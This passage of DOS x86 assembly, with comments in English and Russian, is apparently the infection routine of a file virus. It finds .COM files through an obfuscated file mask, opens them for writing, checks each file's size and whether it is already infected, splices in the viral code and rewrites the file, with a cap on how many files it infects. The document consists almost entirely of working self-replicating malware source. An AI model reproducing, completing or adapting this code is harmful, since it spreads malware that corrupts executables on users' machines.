mem:
@m1:    nop
@m2:    mov     ah,48h                  ; allocate mem for buf
@m3:    mov     bx,1000h
@m4:    int     21h
@m5:    jc      short mem_not_ok
        lea     bp,@mem_ok
mem_not_ok:
@m6:    mov     ah,49h                  ; free mem
@m7:    int     21h
@m8:    mov     ah,48h                  ; get free mem size (bx)
@m9:    xor     bx,bx
@m10:   dec     bx
@m11:   int     21h
@m12:   sub     bx,1001h                ; reserve 1001h x 16 bytes
@m13:   mov     ah,48h                  ; allocate all other mem
@m14:   int     21h
@m15:   lea     bp,@mem
mem_ok:
@m16:   nop
@m17:   mov     cs:inf_q,0              ; infect count
@m18:   mov     segbuf,ax               ; segbuf = seg for buf
@m19:   mov     es,ax                   ; es = segbuf
@m20:   lea     si,msk                  ; [si] = '*.com',0
        sub     cs:[msk],'19'
        sub     cs:[msk+2],'98'
@m21:   mov     di,7Ah                  ;
@m22:   push    di
@m23:   movsw
@m24:   movsw
@m25:   movsw
@m26:   mov     ds,ax                   ; ds = segbuf
@m27:   mov     ah,1Ah                  ; set DTA to segbuf:80h
@m28:   mov     dx,di
@m29:   int     21h
find1st:
@m30:   mov     ah,4Eh                  ; find 1st file
@m31:   mov     cx,20h                  ; attr: archive
@m32:   pop     dx                      ; name = segbuf:7Ah
@m33:   int     21h
@m34:   jnc     short find1st_ok
        lea     bp,@end_infect              ; err -> end infect
find1st_ok:
        add     cs:[msk],'19'
        add     cs:[msk+2],'98'
findnext:
@m35:   nop
@m36:   mov     ds,cs:[segbuf]
@m37:   mov     ah,4Fh
@m38:   mov     dx,80h
@m39:   int     21h
@m40:   jnc     short findnext_ok
        lea     bp,@end_infect
findnext_ok:
@m41:   mov     dx,9Eh
@m42:   mov     ax,3d02h
@m43:   int     21h
@m44:   jnc     short open_ok
        lea     bp,@findnext
open_ok:
@m45:   mov     cs:[handle],ax
@m46:   xchg    ax,bx
@m47:   mov     ah,3Fh
@m48:   mov     dx,100h
@m49:   mov     cx,0FFFFh
@m50:   int     21h
@m51:   mov     cs:[fsize],ax
@m52:   cmp     ax,10000h-(endvir-s)
        ja      short bad_file
        cmp     ax,(endvir-s)
        ja      short good_file
bad_file:
        lea     bp,@close_file
good_file:
@m53:   push    ds
@m54:   push    cs
@m55:   pop     ds
@m56:   pop     es
@m57:   mov     si,100h
@m58:   push    si
@m59:   mov     di,si
@m60:   mov     cx,sign-s
@m61:   repe    cmpsb
@m62:   pop     si
@m63:   jne     short clear_ok
        lea     bp,@close_file
clear_ok:
@m64:   mov     di,si
@m65:   mov     cx,vs
@m66:   rep     movsb
@m67:   lea     si,cmdlist
infect_by_next:
@m68:
        mov     bx,cs:[_last]
        mov     ax,cs:[_savew]          ; restore word where was int3
        mov     cs:[bx],ax
infect_by_next2:
        mov     [tab_index],si   ; si = ofs in cmdlist
        lodsw
        push    ax               ; ax = ofs cmd
        xor     ax,ax
        lodsb
        mov     dx,ax            ; dx = len cmd
        pop     si               ; si = ofs cmd
        lea     di,dataend       ; di = ofs after VirMain & Data
        mov     cx,[fsize]       ; file len
        sub     cx,dataend-s     ; cx = cx - (VirMain & Data)
        sub     cx,dx            ; cx = cx - cmd.len
        inc     cx               ; cx = cx + 1  ;[?]
find_block:
        nop
        mov     al,byte ptr [si] ; al = 1st byte of cmd
        repne   scasb            ; find it in file
        jcxz    short block_not_found
        jmp     short chk_equ_block
block_not_found:
        mov     cx,dx            ; cx = cmd.len
        add     di,dx            ; di = ofs after end of file ; ???
        push    di
        add     [fsize],cx       ; file size = file size + cmd.len
        rep     movsb
        pop     di               ; di = ofs after end of file
        jmp     short end_find_block
chk_equ_block:
        push    di
        push    si
        push    cx
        dec     di               ; di = ofs of may_be_equal cmd
        mov     cx,dx            ; cx = cmd.len
        repe    cmpsb            ;
        mov     ax,cx            ; ax = 0 if it's equal cmd
        pop     cx
        pop     si
        pop     di
        jne     short find_block       ; af ax <> 0 - find again
        dec     di
end_find_block:
        mov     si,[tab_index]   ; si = ofs cmd in cmdlist
        xchg    di,si            ; di = ofs cmd in cmdlist ; si = new ofs cmd
        xchg    ax,si            ; ax = new ofs cmd ; si = ?
        stosw                    ; change ofs in cmdlist to new
        inc     di               ; skip cmd.len
        xchg    si,di            ; si = ofs next cmd in cmdlist
        cmp     si,ofs cmdlistend; end of cmdlist
        jne     short infect_by_next2   ; no -> next cmd

        mov     bx,cs:[_last]    ; restore int3
        mov     bptr cs:[bx],0CCh
stop_infect:
@m69:   nop
@m70:   mov     bx,[handle]      ; bx = handle
@m71:   push    ds               ; ds = cs
@m72:   mov     ax,4200h
@m73:   cwd
        xor     cx,cx
@m74:   int     21h              ; lseek to begin
@m75:   mov     dx,[fsize]       ; dx = file size + not founded cmds
@m76:   mov     cx,dataend-s     ; длина VirMain & Data
@m77:   add     dx,101h          ; почему 101h а не 100h
@m78:   push    es
@m79:   pop     ds               ; ds = seg for allocate file
@m80:   mov     [oentry],dx      ;
@m81:   mov     ah,3Fh
@m82:   int     21h              ; read original begin
@m83:   add     dx,cx
@m84:   push    dx               ; dx = длина уже зараженного файла
@m85:   mov     ax,4200h
@m86:   cwd
@m87:   xor     cx,cx
@m88:   int     21h              ; lseek to begin
@m89:   mov     ah,40h
@m90:   pop     cx               ; cx = длина уже зараженного файла
@m91:   mov     dx,100h
@m92:   dec     ch               ; в файле = в памяти - 100h
@m93:   int     21h              ; save infected file
@m94:   pop     ds               ; ds = cs
@m95:   inc     inf_q
close_file:
@m96:   nop
@m97:   mov     ah,3Eh
@m98:   int     21h
@m99:   cmp     inf_q,inf_max
@m100:  je      short end_infect
        lea     bp,@findnext
end_infect:
@m101:  nop
@m102:  mov     es,[segbuf]
@m103:  mov     ah,49h                  ; free buf seg
@m104:  int     21h
@m105:  push    cs
@m106:  pop     es
@m107:  mov     ah,49h                  ; free current seg
@m108:  int     21h
@m109:  mov     ah,48h
@m110:  mov     bx,0FFFFh               ; get max size of mem block
@m111:  int     21h
@m112:  mov     ah,48h                  ; allocate all aviable mem
@m113:  int     21h
@m114:  mov     ah,1Ah                  ; restore DTA
@m115:  mov     dx,80h
@m116:  int     21h
@m117:  xor     bp,bp                   ; equ jmp restore
@m118: